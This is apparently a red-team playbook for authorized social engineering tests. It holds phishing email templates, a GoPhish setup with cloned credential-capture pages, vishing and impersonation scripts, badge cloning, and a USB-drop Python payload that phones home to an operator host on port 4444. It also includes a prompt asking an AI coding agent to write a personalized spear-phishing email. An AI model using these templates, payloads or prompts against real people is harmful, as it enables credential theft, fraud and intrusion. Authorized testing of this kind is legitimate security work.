# PLAYBOOK: Social Engineering — Authorized Simulations
# April 2026 Red Team Stack
# Phishing · Vishing · Pretexting · Physical
# ONLY for authorized engagements with explicit written scope

---

## Authorization Gate

⚠️  HARD STOP: Social engineering REQUIRES explicit written authorization.
    This must name the specific techniques permitted.
    "Phishing" is not the same as "vishing" — both must be named.
    Physical access must be explicitly scoped.

Required in scope document:
□ Phishing authorized (email)
□ Vishing authorized (phone)
□ Pretexting authorized (impersonation)
□ Physical authorized (tailgating, badge cloning)
□ Named targets / departments (or "all employees")
□ Testing period dates
□ Emergency stop contact

---

## OSINT Phase (Always First)

Load AutoGPT OSINT playbook first → build intelligence.
The quality of social engineering is determined by intelligence quality.

```
From playbooks/autogpt-osint.md — TASK 4:
Build social engineering intelligence profile for [COMPANY].

Collect:
- Key decision makers (CEO, CFO, IT Manager)
- Email format: first.last@domain or flast@domain
- Recent announcements (mergers, layoffs, new products)
- Vendors and partners publicly mentioned
- Internal tools visible in job posts (Slack, Jira, SAP, ServiceNow)
- Company events mentioned publicly
- LinkedIn recent posts from employees (what's trending internally)
```

---

## PHASE 1 — PHISHING SIMULATION

### Infrastructure Setup
```bash
# Domain setup
# 1. Register lookalike domain (BEFORE engagement start)
#    company.com → company-secure.com / company-helpdesk.net
#    Note: register from non-attributable registrar
# 2. Configure SPF/DKIM/DMARC to maximize deliverability
# 3. Age the domain (ideally 30+ days before use)

kali_exec("sudo apt install gophish")

# GoPhish setup
kali_exec("cd /opt/gophish && ./gophish &")
# Admin UI at https://localhost:3333
# Default creds: admin/gophish (change immediately)
```

### GoPhish Campaign Configuration
```
1. SMTP Profile:
   Host: [YOUR_SMTP]:[PORT]
   From: IT Support <it-support@company-helpdesk.net>

2. Landing Page:
   Clone: https://[TARGET_COMPANY]/login (or O365, etc.)
   Enable capture credentials: YES
   Enable capture passwords: YES (for simulation measurement)
   Redirect to: Real company page (so it looks like failed login)

3. Email Template:
   Subject: [Contextual — uses pretext from OSINT]
   Body: [Personalized — uses employee data from OSINT]
   Add tracking pixel: YES (measures opens)
   Add link: YES → landing page

4. Groups:
   Import CSV: name, email, position, department
   Source: LinkedIn scrape or provided employee list

5. Campaign:
   Launch at: optimal send time (Tue-Thu, 8-10am)
   Track: Opened, Clicked, Submitted Credentials
```

### Email Template Examples

**IT Helpdesk / Password Reset Pretext:**
```
Subject: [ACTION REQUIRED] Your [COMPANY] account expires in 24 hours

Hi [FIRST_NAME],

Our security team has detected unusual activity on your account.
To maintain access to company systems, please verify your credentials
using the link below within 24 hours.

[Verify Account] → [LANDING_PAGE]

If you did not request this, please contact IT immediately.

IT Security Team
[COMPANY] Corporate IT
```

**Invoice / Finance Pretext (CFO/AP targets):**
```
Subject: Invoice #[RANDOM] requires your approval

Hi [FIRST_NAME],

Please review and approve the attached invoice from [KNOWN_VENDOR].
Payment is due within 48 hours per our contract terms.

[Review Invoice] → [LANDING_PAGE]

[COMPANY] Accounts Payable
[REALISTIC_SIGNATURE]
```

**HR / Benefits Pretext:**
```
Subject: 2026 Benefits Enrollment — Action Required by [DATE+7]

Hi [FIRST_NAME],

Open enrollment for 2026 benefits closes on [DATE+7].
Please log in to review your options and confirm selections.

[Access Benefits Portal] → [LANDING_PAGE]

Human Resources
[COMPANY]
```

---

## PHASE 2 — SPEAR PHISHING (Targeted)

High-value targets (C-suite, finance, IT admins) get individually crafted emails.

```
Using AutoGPT social eng profile + Claude Code:
"Write a convincing spear phishing email targeting [NAME], [ROLE] at [COMPANY].
Context from OSINT:
- Recent company news: [NEWS]
- Their LinkedIn post from last week: [TOPIC]
- Company vendor: [VENDOR] (who we'll impersonate)
- Email format confirmed: first.last@[DOMAIN]

Goal: Get them to click a link to a credential harvesting page.
Frame: Urgent vendor invoice requiring approval.
Tone: Match their communication style from LinkedIn.
Do NOT use generic language — personalize to their specific role."
```

---

## PHASE 3 — VISHING (Phone)

```
AUTHORIZED vishing only. Document every call.

PRETEXT EXAMPLES:

IT Helpdesk:
"Hi, this is [NAME] from IT. We're getting an alert that your
account is showing failed logins from [LOCATION]. I need to verify
your current password to rule you out as the source... Actually,
I can't ask for passwords — let me send you a verification link
instead. What's a good email to send that to?"

Vendor callback:
"Hi, I'm [NAME] from [KNOWN_VENDOR] — we sent an invoice last week
and our system shows it's in your approval queue. Could you help me
understand what information your team needs to process it?"

IT Survey:
"Hi, I'm doing a quick internal security survey — it only takes
2 minutes. Do you use your company password for any personal accounts?"

VISHING RULES:
- Record call (with authorization)
- Note: time, target name, result
- Never threaten or coerce
- Stop immediately if target becomes upset or asks for callback number
- Document: what worked, what didn't, what information was obtained
```

---

## PHASE 4 — PRETEXTING (Impersonation)

```
Impersonation scenarios (all require explicit written auth):

1. Vendor / Contractor
   Pretext: [KNOWN_VENDOR] technician here to service [EQUIPMENT]
   Goal: Physical access to server room / workstations

2. IT Remote Support
   Pretext: Following up on your ticket — need to install security update
   Goal: Remote access, credential harvest, install test agent

3. Fire Safety / Health Inspector
   Pretext: Annual compliance inspection
   Goal: Physical premises access

4. New Employee
   Pretext: Just started, need access to [SYSTEM]
   Goal: Social engineering helpdesk for account creation

ALWAYS:
□ Have a "get out of jail" letter from client
□ Know the emergency stop contact phone number
□ Stop immediately if confronted aggressively
□ Never enter areas not specified in scope
```

---

## PHASE 5 — PHYSICAL (If In Scope)

```bash
# Badge / RFID cloning
# If proximity cards are in scope: use Proxmark3 or Flipper Zero
# Technique: get within 10cm of target's wallet/badge holder
# Equipment concealed in bag with card reader

# Tailgating
# Follow authorized personnel through secure door
# "Oh, my hands are full — could you hold that?"
# Document: which doors, which time of day, success rate

# USB drop
# Place labeled USB in common areas (break room, parking lot)
# Label: "SALARY_REVIEW_2026.xlsx"
# Contains: tracking payload that phones home when opened
# Monitor who opens it → report percentage, time delay

kali_write_file("/tmp/usb_payload_safe_test.py", """
# SAFE TEST VERSION — just sends notification, no actual compromise
import socket, os, datetime

try:
    with socket.socket() as s:
        s.connect(('[OPERATOR_IP]', 4444))
        s.send(f'USB opened: {os.environ.get(\"COMPUTERNAME\", \"unknown\")} at {datetime.datetime.now()}'.encode())
except:
    pass  # Fail silently
""")
```

---

## PHASE 6 — METRICS AND REPORTING

```
GoPhish provides real-time metrics:
- Email sent: [N]
- Email opened: [N] ([X]%)
- Link clicked: [N] ([X]%)
- Credentials submitted: [N] ([X]%)
- Reported to IT: [N] ([X]%)

Industry benchmarks (for comparison):
- Average click rate: ~14% (Proofpoint State of Phish 2025)
- Credential submission: ~5-8% of clickers
- Report rate (if security culture is good): >30% of targets
- With security training in last 30 days: ~5% click rate

Client-facing phishing report template:
1. Executive Summary: X% of employees clicked
2. High-Risk Departments (breakdown by team)
3. Campaign Details (infrastructure, pretexts used)
4. Most Effective Pretexts (by click rate)
5. Credential Submission Analysis (how many, which roles)
6. Recommendations: Security awareness training, DMARC, etc.
7. Remediation: Enrol clicked users in mandatory training

Evidence:
loot/[MISSION]/social/
├── gophish_export.csv          # All campaign results
├── credentials_captured.txt    # ENCRYPT IMMEDIATELY
├── call_log.csv                # Vishing call records
├── physical_log.md             # Physical test log
└── phishing_report.md          # Client deliverable
```

---

*April 2026 | Social engineering — authorized simulations that improve human security*
